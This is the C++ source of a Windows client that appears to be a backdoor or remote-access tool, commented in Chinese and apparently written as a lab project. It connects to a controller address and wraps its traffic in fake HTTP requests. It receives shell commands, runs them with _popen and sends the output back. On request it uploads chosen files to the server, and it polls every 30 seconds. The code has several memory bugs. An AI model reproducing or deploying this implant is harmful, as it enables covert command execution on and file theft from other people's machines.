// Client.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <iostream>
#include <winsock2.h>

using namespace std;

#pragma comment(lib, "ws2_32.lib")

#define REMOTE_PORT			4000
#define REMOTE_IP_ADDRESS "127.0.0.1"

#define CMD_NULL		0
#define CMD_CMD			1
#define CMD_DOWNLOAD	2

#define MAX_CMD_LEN		256
#define MAC_ADDR_LEN	17
#define POST_LEN		210
#define DEFAULT_BUFLEN  1024
#define POST_FILE_LEN   1234
char MacAddr[MAC_ADDR_LEN];
char cmdbuffer[DEFAULT_BUFLEN] = { 0 };          //用1024的空间来存储输出的内容，只要不是显示文件内容，一般情况下是够用了。  

char* protocolHead = "GET http://127.0.0.1:4000/ HTTP/1.1\r\n"
"Accept: text/html, application/xml, */*\r\nAccept-Language: zh-cn\r\n"
"Accept-Encoding: gzip, deflate\r\nHost: 127.0.0.1:4000\r\n"
"User-Agent: Browser <0.1>\r\nConnection: Keep-Alive\r\n\r\n";

char* PostHead = "POST http://127.0.0.1:4000/ HTTP/1.1\r\n"
"Accept: text/html, application/xml, */*\r\nAccept-Language: zh-cn\r\n"
"Accept-Encoding: gzip, deflate\r\nHost: 127.0.0.1:4000\r\n"
"User-Agent: Browser <0.1>\r\nConnection: Keep-Alive\r\n\r\n";

char * killhead(char* headcmd)
{
	char * goal;
	int len = strlen(headcmd) - (strstr(headcmd, "\r\n\r\n") - headcmd) - 4;
	if (!len || len > 10000)return NULL;
	cout << "数据包长度" << len << endl;
	goal = strncpy(headcmd, strstr(headcmd, "\r\n\r\n") + 4, len);
	goal[len] = '\0';
	return goal;
}


char* combine(char *s1, char *s2)
{
	char *result = (char *)malloc(strlen(s1) + strlen(s2) + 1);
	if (result == NULL) exit(1);
	strcpy(result, s1);
	strcat(result, s2);
	return result;
}

int getFileSizeSystemCall(char * strFileName)
{
	struct stat temp;
	stat(strFileName, &temp);
	return temp.st_size;
}

char* combine(char *s1, char *s2, int len)
{
	char *result = (char *)malloc(len + 1);
	if (result == NULL) exit(1);
	strcpy(result, s1);
	for (int i = POST_LEN; i <= len + 1; i++)
		result[i] = s2[i - POST_LEN];
	return result;
}

char* filecombine(char * sendbuf)
{
	char ans[POST_FILE_LEN];
	memset(ans, 0, POST_FILE_LEN);
	strcpy(ans, PostHead);
	for (int i = POST_LEN; i < POST_FILE_LEN ; i++)
		ans[i] = sendbuf[i - POST_LEN];
	cout << ans<<"<---";
	return ans;
}


void init()
{
	// get mac address
	memset(MacAddr, 0, MAC_ADDR_LEN);
	GUID uuid;
	CoCreateGuid(&uuid);
	// Spit the address out
	sprintf(MacAddr, "%02X:%02X:%02X:%02X:%02X:%02X",
		uuid.Data4[2], uuid.Data4[3], uuid.Data4[4],
		uuid.Data4[5], uuid.Data4[6], uuid.Data4[7]);
	//cout << "本机mac地址为"<<MacAddr << endl;
	return;
}

int recvn(SOCKET s, char* recvbuf, unsigned int fixedlen)
{
	int iResult;    //存储单次recv操作的返回值
	int cnt;         //用于统计相对于固定长度，剩余多少字节尚未接收
	cnt = fixedlen;
	while ( cnt > 0 ) {
		iResult = recv(s, recvbuf, cnt, 0);
		if ( iResult < 0 ){
			//数据接收出现错误，返回失败
			printf("接收发生错误: %d\n", WSAGetLastError());
			return -1;
		}
		if ( iResult == 0 ){
			//对方关闭连接，返回已接收到的小于fixedlen的字节数
			printf("连接关闭\n");
			return fixedlen - cnt;
		}
		//printf("接收到的字节数: %d\n", iResult);
		//接收缓存指针向后移动
		recvbuf +=iResult;
		//更新cnt值
		cnt -=iResult;         
	}
	return fixedlen;
}

char *execute_cmd(char *strCmd)
{
	return "";
}

bool execmd(char* cmd, char* result) {
	char buffer[DEFAULT_BUFLEN];                         //定义缓冲区                        
	FILE* pipe = _popen(cmd, "r");            //打开管道，并执行命令 
	if (!pipe)
		return 0;                      //返回0表示运行失败 

	while (!feof(pipe)) {
		if (fgets(buffer, 128, pipe)) {             //将管道输出到result中 
			strcat(result, buffer);
		}
	}
	_pclose(pipe);                            //关闭管道 
	cout << result << endl;
	return 1;                                 //返回1表示运行成功 
}

int main(int argc, char * argv[])
{
	WSADATA Ws;
	SOCKET ClientSocket;
	struct sockaddr_in ServerAddr;
	int Ret = 0;
	int AddrLen = 0;
	HANDLE hThread = NULL;
	char SendBuffer[MAX_PATH];
	char RecvBuffer[MAX_PATH];
	int reclen;
	char CmdBuff[MAX_CMD_LEN];
	char strCmdNo[2];
	char *pStrCmd;
	int CmdNo;
	
	init();//get mac

	//Init Windows Socket
	if ( WSAStartup(MAKEWORD(2,2), &Ws) != 0 )
	{
		cout<<"Init Windows Socket Failed::"<<GetLastError()<<endl;
		return -1;
	}
	//Create Socket
	ClientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if ( ClientSocket == INVALID_SOCKET )
	{
		cout<<"Create Socket Failed::"<<GetLastError()<<endl;
		return -1;
	}

	ServerAddr.sin_family = AF_INET;
	ServerAddr.sin_addr.s_addr = inet_addr(REMOTE_IP_ADDRESS);
	ServerAddr.sin_port = htons(REMOTE_PORT);
	memset(ServerAddr.sin_zero, 0, 8);

	Ret = connect(ClientSocket,(struct sockaddr*)&ServerAddr, sizeof(ServerAddr));
	if ( Ret == SOCKET_ERROR )
	{
		cout<<"Connect Error::"<<GetLastError()<<endl;
		return -1;
	}
	else
	{
		cout << endl;
		cout << "                                           *------------------------------*" << endl;
		cout << "                                           |        成功启动客户端        |" << endl;
		cout << "                                           |  mac地址 ：" << MacAddr << " |" << endl;
		cout << "                                           |  IP地址  ：" << inet_ntoa(ServerAddr.sin_addr) << "         |" << endl;
		cout << "                                           |  端口地址：" << ntohs(ServerAddr.sin_port) << "              |" << endl;
		cout << "                                           *------------------------------*" << endl;
	}

	cout << "开始与服务器进行交互" << endl;
	while ( true )
	{
		Ret = send(ClientSocket, protocolHead, strlen(protocolHead), 0);
		if (Ret>0) cout << "发送GET请求,"<< strlen(protocolHead)<<"字节"<< endl;
		if (Ret != strlen(protocolHead))
		{
			cout << "Send Info Error::" << GetLastError() << endl;
			break;
		}

		memset(RecvBuffer, 0, MAX_PATH);
		Ret = recv(ClientSocket, RecvBuffer, MAX_PATH, 0);
		if (Ret > 0)
		{
			cout << "接收到Http响应：" << RecvBuffer << "(" << Ret << ")" << endl;
		}

		//cin.getline(SendBuffer, sizeof(SendBuffer));
		// send mac address
		Ret = send(ClientSocket, combine(PostHead, MacAddr), MAC_ADDR_LEN + strlen(PostHead), 0);
		cout << "发送POST请求,包含mac地址：" << MacAddr << endl;
		if (Ret != MAC_ADDR_LEN + strlen(PostHead))
		{
			cout << "Send Info Error::" << GetLastError() << endl;
			break;
		}
		//
		// recv cmd information
		//
		Ret = recv(ClientSocket, RecvBuffer, MAC_ADDR_LEN + POST_LEN, 0);
		if(Ret== MAC_ADDR_LEN + POST_LEN)
		reclen = atoi(killhead(RecvBuffer));
		if(reclen>2)cout << "接收到" << reclen-2 <<"字节命令"<< endl;

		//
		// recv cmd information
		//
		memset(RecvBuffer, 0, MAX_PATH);
		if(reclen > 0)
		{
			bool suc;
			char * error = "客户端执行该命令时返回异常！\n";
			//Ret = recvn(ClientSocket, CmdBuff, reclen);
			Ret = recv(ClientSocket, RecvBuffer, MAX_PATH, 0);
			char* CmdBuff = killhead(RecvBuffer);
			cout << CmdBuff;
			
			cout << "执行指令！" << endl;
			strCmdNo[0] = CmdBuff[0];
			strCmdNo[1] = '\0';
			CmdNo = atoi(strCmdNo);
			pStrCmd = CmdBuff + 2;
			cout << "指令类型为"<<CmdNo<<endl;
			switch(CmdNo)
			{
			case CMD_CMD:
				printf("cmd: %s\n", pStrCmd);
				// execute cmd and send result to server
				memset(cmdbuffer, 0, sizeof(cmdbuffer));
				suc = execmd(pStrCmd,cmdbuffer);
				int iResult;
				if (suc)
				{
					//iResult = send(ClientSocket, cmdbuffer, DEFAULT_BUFLEN, 0);
					Ret = send(ClientSocket, combine(PostHead, cmdbuffer), DEFAULT_BUFLEN + strlen(PostHead), 0);
					cout << "发送POST请求,包含执行命令返回值：" << MacAddr << endl;
					if (Ret != DEFAULT_BUFLEN + strlen(PostHead))
					{
						cout << "Send Info Error::" << GetLastError() << endl;
						break;
					}
				}
				else iResult = send(ClientSocket, error, DEFAULT_BUFLEN, 0);
				if (iResult == SOCKET_ERROR) {
					printf("发送失败！错误编号: %d\n", WSAGetLastError());
					closesocket(ClientSocket);
					WSACleanup();
					return 1;
				}
				memset(RecvBuffer, 0, MAX_PATH);
				Ret = recv(ClientSocket, RecvBuffer, MAX_PATH, 0);
				if (Ret > 0)
				{
					cout << "接收到Http响应：" << RecvBuffer << "(" << Ret << ")" << endl;
				}
				break;

			case CMD_DOWNLOAD:
				// read file and send to server
				printf("download file: %s\n", pStrCmd);
				
				char sendbuf[POST_FILE_LEN];
				FILE *file = NULL;
				char *filename = pStrCmd;
				file = fopen(filename, "rb");
				int filelen = getFileSizeSystemCall(filename);
				cout << "数据长度为  " << filelen << endl;

				char lenchar[MAC_ADDR_LEN];
				sprintf(lenchar, "%d", filelen);

				iResult = send(ClientSocket, combine(PostHead, lenchar), MAC_ADDR_LEN + strlen(PostHead), 0);
				memset(RecvBuffer, 0, MAX_PATH);
				Ret = recv(ClientSocket, RecvBuffer, MAX_PATH, 0);
				if (Ret > 0)
				{
					cout << "接收到Http响应：" << RecvBuffer << "(" << Ret << ")" << endl;
				}

				int tosendlen = filelen;

				// 发送缓冲区中的测试数据
				while (tosendlen > 0)
				{
					cout << "还有" << tosendlen << "个字节需要发送" << endl;
					//iResult = send(ClientSocket, PostHead, POST_LEN, 0);
					memset(sendbuf, 0, POST_FILE_LEN);
					char* buf = sendbuf;
					for (int i = 0; i < POST_LEN; i++)
					{
						*buf = PostHead[i];
						buf++;
					}
					for (int i = 0; i < DEFAULT_BUFLEN; i++)
					{
						fread(buf, 1, 1, file);
						buf++;
					}

					//fread(sendbuf, 1, DEFAULT_BUFLEN, file);
					int iSend = DEFAULT_BUFLEN;
					if (tosendlen < DEFAULT_BUFLEN) iSend = tosendlen;
					iResult = send(ClientSocket, sendbuf, iSend+ POST_LEN, 0);
					if (iResult == SOCKET_ERROR) {
						printf("发送失败！错误编号: %d\n", WSAGetLastError());
						closesocket(ClientSocket);
						WSACleanup();
						return 1;
					}
					tosendlen -= iResult-POST_LEN;
					memset(RecvBuffer, 0, MAX_PATH);
					Ret = recv(ClientSocket, RecvBuffer, MAX_PATH, 0);
					if (Ret > 0)
					{
						cout << "接收到Http响应：" << RecvBuffer << "(" << Ret << ")" << endl;
					}
				}

				fclose(file);

				cout << "文件上载成功！" << endl;

				break;
			}
		}
		
		Sleep(30*1000);
	}

	closesocket(ClientSocket);
	WSACleanup();
	return 0;
}